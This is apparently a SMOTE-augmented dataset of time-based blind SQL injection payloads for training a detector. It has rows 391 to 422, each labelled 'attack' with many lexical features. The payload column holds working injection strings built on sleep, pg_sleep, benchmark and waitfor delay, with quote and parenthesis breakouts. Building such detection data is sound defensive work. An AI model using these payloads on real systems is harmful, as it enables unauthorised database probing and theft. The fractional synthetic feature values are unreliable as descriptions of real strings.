id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000391,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,1.5870161312109419,88.02748974697943,21.69336499026844,2.9618444018344423,21.0,7.546919922147515,45.70710986375815,13.773459961073758,0.2436640945406893,0.08098652009767368,0.5188256041029481,0.15652378125868888,4.0,0.0,0.0,0.0,0.0,1.6933649902684393,0.0,7.386729980536879,0.0,0.0,0.6933649902684393,1.6933649902684393,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6933649902684393,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6933649902684396
SMOTE_000392,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,0.6293135054077353,90.57112838152689,22.14278209538172,3.014240099348351,28.0,2.1422567630537674,46.0,14.428871618473117,0.30922085169234603,0.023195269538216545,0.5080056849231398,0.15957819384629754,2.571653713854838,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.8572179046182791,0.0,0.0,2.0,0.8572179046182793,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000393,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,1.1459540241305264,89.74761724031774,28.41640191559086,3.670962518676915,31.860140357166486,10.0,36.860140357166486,11.027336525984765,0.3540703324705903,0.11339378136173725,0.41076722315145886,0.12176866301621361,3.221869220787813,0.0,0.0,0.0,0.0,1.0,0.0,5.610934610393906,0.0,1.0,0.0,1.0,0.8054673051969531,0.0,0.0,0.1945326948030469,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8054673051969531,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.805467305196953
SMOTE_000394,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,1.1257206169114888,64.57033276753303,24.140665535066052,3.4408586391230913,18.570332767533024,10.0,28.0,8.0,0.2875565642563748,0.1548790077703533,0.4336612217569893,0.12390320621628265,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5703327675330256,0.4296672324669743,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000395,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.4947452249034661,85.88477687344184,19.43494850925581,2.8805966353267825,27.144982836418603,2.0,44.44982836418603,12.289965672837207,0.3166776611041032,0.02334688834721603,0.5169047836320112,0.1430706669166695,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.289965672837207,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.14498283641860332,0.8550171635813967,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000396,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000145,2.1443605612738175,57.0,24.0,3.6423218893895837,18.422482518846074,10.0,22.0,6.577517481153926,0.3232014476990539,0.17543859649122806,0.38596491228070173,0.11539504352901622,0.0,1.0,1.1550349623078509,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.155034962307851,0.0,1.0,0.5775174811539254,0.42248251884607446,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4224825188460745,0.5775174811539254,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000397,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000134,0.9441525167894821,72.54359894142318,22.815398412134783,3.4529680465390755,15.271799470711596,18.0,30.0,9.271799470711596,0.2104758967285824,0.2481635170897865,0.41360586181631087,0.12775472436532023,0.2717994707115947,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.271799470711595,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.271799470711595,0.7282005292884051,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000398,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000122,0.7335420562735968,77.41868760832263,19.709343804161314,2.978155100312433,27.0,2.0,38.709343804161314,9.709343804161316,0.3488015240511621,0.02583714992971571,0.5,0.12536132601912217,0.0,0.709343804161315,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.7093438041613152,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000399,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000139,1.471754009796176,68.74296679816372,23.68574169954093,3.493320168175555,15.671435424885232,15.371483399081862,28.357177124426165,9.342870849770465,0.2301488240146523,0.21997119505244894,0.4138262123165481,0.1360537686163507,0.6714354248852328,0.0,2.0,0.0,0.0,1.671435424885233,0.0,4.0,0.0,0.0,1.0,3.671435424885233,0.6714354248852329,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6714354248852329,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.671435424885233
SMOTE_000400,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.20684598982708546,72.75376703984861,23.057982079988353,3.4833398985426234,17.0,19.0,28.579820799883542,8.173946239965064,0.2340173137781983,0.2615487624579863,0.392261702692133,0.1121722210716823,0.0,0.057982079988354474,0.0,0.0,0.0,1.0,0.0,5.115964159976709,0.0,0.0,1.0,1.0,0.0,0.05798207998835431,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000401,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000150,1.7120554903824066,64.52917809354135,22.941643812917317,3.403650271659231,19.470821906458657,10.0,28.058356187082687,7.0,0.30181467311118443,0.154977937275141,0.4347228335210759,0.1084845560925987,0.0,0.4708219064586575,0.0,0.0,0.0,1.0,0.0,4.529178093541343,0.0,1.0,0.0,1.0,0.0,0.47082190645865757,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4708219064586575,0.5291780935413425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000402,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000072,0.8375601064826518,74.58061397898499,18.80642978528949,2.941955381181013,26.290306989492493,1.2580613978984996,36.7741841936955,10.258061397898498,0.35203027672236364,0.01659888324351405,0.4937058195634513,0.13766502047067108,0.25806139789849847,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.2580613978984987,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000403,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000084,0.3370028783741996,58.29588687377502,20.52808484466874,3.509778145758789,23.0,3.1760282815562464,21.11985859221877,11.0,0.394821140802211,0.05469892387996718,0.36165243319502527,0.18882750212279656,5.1760282815562455,0.0,0.0,0.0,0.0,1.0,0.0,2.823971718443753,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000404,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.45963050074798856,98.07539521353684,28.132086398066164,3.743975399373853,26.660431990330828,21.07539521353684,37.6037408058015,12.735827203867668,0.27244427881980615,0.21440551509028727,0.38338881441150074,0.12976139167840584,3.867913601933834,0.0,0.0,0.0,0.0,1.8679136019338343,0.0,6.0,0.0,0.0,1.0,1.8679136019338345,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.13208639806616562,0.0,0.0,0.0,1.8679136019338345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000405,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,1.3026116230955944,91.14274405801949,20.3809146860065,2.85480819098098,20.4603048953355,7.841219581341997,48.3809146860065,14.460304895335499,0.225452944008253,0.08297671464057649,0.5325094293477096,0.15906091200346095,4.0,0.0,0.0,0.0,0.0,1.7301524476677494,0.0,8.0,0.0,0.0,0.7301524476677496,1.7301524476677497,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2698475523322503,0.7301524476677494,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000406,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,1.554305987666364,77.2220492641558,24.0,3.4631832019468005,17.0,19.0,31.594628805775365,9.627420458380435,0.22287632569365942,0.24909706989291347,0.40399750457664113,0.12402909983678603,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.627420458380436,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000407,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000101,0.427500534500258,87.11734638665641,28.0,3.6542538011461025,25.0,18.0,34.69387710932513,9.423469277331282,0.2871982144226915,0.20678271438433787,0.39792249980823197,0.10809657138473873,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.423469277331282,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000408,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,0.8208667988591783,61.56011339224099,19.65982991163851,3.281476979603567,26.439886607759007,1.0,26.120226784481986,8.0,0.4297607584631163,0.016247281346171774,0.42401370942133776,0.1299782507693742,0.0,3.0,0.0,0.0,0.0,0.0,0.0,4.780056696120497,0.0,0.21994330387950312,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7800566961204969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.780056696120497
SMOTE_000409,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,0.013739414353016838,62.058564509987235,19.0,3.2062463460206825,26.0,1.0,27.05856450998723,8.0,0.4189650083820614,0.016114038783925436,0.4360086425626096,0.1289123102714035,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000410,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.23059384904629507,69.85279250737076,27.852792507370765,3.8577980770920557,16.0,21.0,24.0,8.852792507370763,0.2290662436727033,0.3006494448204231,0.34359936550905495,0.1266849459978186,0.9263962536853818,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.9263962536853818,0.0,1.0,1.0,0.9263962536853816,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000002,0.5082709797305239,63.02010919186756,20.306032757560267,3.0438967202936724,13.408043676747024,11.816087353494048,29.795978161626486,8.0,0.21237394454839542,0.18624019148881896,0.4741817585718673,0.12720410539091834,0.0,0.0,0.0,0.0,0.0,0.10201091918675598,0.0,5.897989080813244,0.0,0.0,1.0,0.10201091918675598,0.0,0.0,0.0,1.0,0.0,0.10201091918675598,1.0,0.0,0.0,0.10201091918675598,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000412,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000037,0.05855421396775971,64.90119894230295,22.02470026442426,3.3532843586687675,19.0,10.0,27.925899206727212,7.975299735575737,0.29281436439844644,0.15411282336760337,0.430215891512223,0.12285692072172721,0.0,1.0,1.9752997355757373,0.0,0.0,1.0,0.0,3.9876498677878685,0.0,0.0,0.0,2.9752997355757373,0.0,1.0,0.9876498677878687,0.012350132212131243,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000413,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000065,0.7346646229035187,59.353965160735015,25.81237909644101,4.184795978015929,24.083172128588014,12.0,14.729206967852999,8.541586064294007,0.40522243698992866,0.20245003231285708,0.2487642382934999,0.14356329240371435,2.2707930321470036,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.2707930321470036,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2707930321470038,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2707930321470036
SMOTE_000414,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000142,0.09294483095694538,76.68788634034583,18.960985792543227,2.659362337000417,18.078028414913543,1.9804928962716133,43.707393444074214,12.921971585086457,0.23624148048160906,0.025787136540818115,0.569555523997977,0.1684158589795958,3.9804928962716146,0.0,0.0,0.0,0.0,1.0,0.0,7.941478688814843,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0195071037283856,0.0,0.0,0.0,1.0,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000415,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000073,0.7248579585157319,62.257279697935246,25.029118791740977,3.8001302827959274,22.257279697935243,10.0,21.0,9.0,0.35747342240589086,0.16063164439852728,0.33732645323690724,0.14456847995867456,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.25727969793524397,0.7427203020647559,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000416,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000118,0.08813159759721158,73.50403637055237,27.053056460058144,3.8382034695859697,23.212225840232573,15.0,25.265282300290718,10.026528230029072,0.3156491438079621,0.2043537007804816,0.3434730045648322,0.13652415084672404,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.053056460058143,0.9734717699709281,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000118,1.3990653507627935,81.00144148965721,27.842256998911285,3.808451398823772,26.36902799564514,15.0,29.211284994556426,10.421128499455643,0.3242861657861792,0.18760845408801993,0.358455593710719,0.12964978641508187,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.842256998911285,0.5788715005443574,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,0.6969107917254302,92.30137455537101,22.150687277685506,3.2561257220396964,35.24656361157247,1.150687277685508,42.45206183305652,13.45206183305652,0.38203450141897666,0.012437772316338538,0.45986724760818887,0.14566047865649592,3.150687277685507,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.3013745553710139,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.150687277685507,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.150687277685507
SMOTE_000419,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.45051648759999025,70.8570005183101,27.785749870422475,3.830062826178806,16.0,21.0,24.857000518310105,9.0,0.22592432272336646,0.2965256735744185,0.35046757217032143,0.12708243153189364,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.214250129577526,0.7857498704224735,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,1.5388180105524158,95.90400825492321,28.44228453501097,3.739590698901741,28.211422675054845,18.90400825492322,36.67314639496709,12.115430929978062,0.29550138671524223,0.19604837896674215,0.3823330236511484,0.1261172106668672,3.5577154649890312,0.0,0.0,0.0,0.0,1.557715464989031,0.0,6.0,0.0,0.0,1.0,1.557715464989031,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.442284535010969,0.0,0.0,0.0,1.5577154649890308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000022,1.2090521662861244,77.33399816646077,16.66799633292156,2.6240130982417855,19.335992665843122,2.0,43.33200366707844,12.66600183353922,0.24989335136091012,0.025862804473373024,0.5604176428639303,0.16382620130178652,0.0,4.0,0.0,0.0,0.0,0.6660018335392197,0.0,8.0,0.0,0.0,0.0,0.6660018335392197,0.0,1.0,0.0,0.0,0.0,0.6660018335392197,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.12281417038252904,70.11141396114269,27.925724025904877,3.857144782817982,15.962862012952437,21.037137987047565,24.148551948190246,8.962862012952439,0.2277138390466512,0.30005087395485963,0.3443688260872589,0.12786646091123022,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.037137987047562,0.9628620129524375,0.0,1.0,1.0,1.0,0.0,0.0,0.9628620129524377,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
